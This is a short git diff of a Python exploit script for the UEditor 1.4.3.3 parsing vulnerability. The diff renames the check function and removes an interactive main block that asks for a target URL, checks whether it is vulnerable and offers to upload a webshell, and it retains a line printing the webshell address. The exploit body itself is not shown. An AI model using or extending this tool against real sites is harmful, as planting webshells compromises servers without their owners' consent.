@@ -7,7 +7,7 @@ from urllib3.exceptions import InsecureRequestWarning
 from urllib3 import disable_warnings
 disable_warnings(InsecureRequestWarning)
 
-def ueditor_1433_Parsing_vulnerability(url):
+def verify(url):
     relsult = {
         'name': 'Ueditor编辑器1.4.3.3 解析漏洞',
         'vulnerable': False
@@ -68,15 +68,3 @@ def exp(url):
         print('[+] Webshell地址:', webshell)
 
 
-
-if __name__ == '__main__':
-    url = input('输入目标URL:')
-    relsult = ueditor_1433_Parsing_vulnerability(url)
-    if relsult['vulnerable']:
-        print('[+] 正在生成报告......')
-        output(relsult)
-        choice = input('[+] 是否利用exp模块上传webshll(Y/n)?')
-        if choice != 'n':
-            exp(url)
-    else:
-        print('[-] 不存在漏洞')
